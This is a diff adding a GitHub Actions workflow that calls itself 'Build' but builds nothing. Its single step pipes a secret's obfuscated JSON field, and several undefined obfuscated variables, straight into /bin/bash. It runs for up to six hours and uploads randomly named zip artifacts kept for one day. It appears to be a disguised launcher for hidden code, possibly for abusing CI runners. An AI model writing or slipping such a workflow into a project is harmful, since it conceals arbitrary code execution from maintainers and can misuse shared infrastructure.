@@ -1,0 +1,31 @@
+name: Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          a21: ${{ secrets.a21 }}
+        run: |
+          printf '%s' "$a21" | jq -r .jpix72254 | /bin/bash
+          printf '%s' "$vtsss91517" | jq -r .sq368 | /bin/bash
+          echo $e553 | jq -r .qmnax621 | /bin/bash
+          echo $szr31234 | jq -r .iyx8124 | /bin/bash
+          echo $fyl89 | jq -r .podm419 | /bin/bash
+          echo $lemty81 | jq -r .ovlm851 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: OkPNjxwt
+          path: "*.zip"
+          retention-days: 1
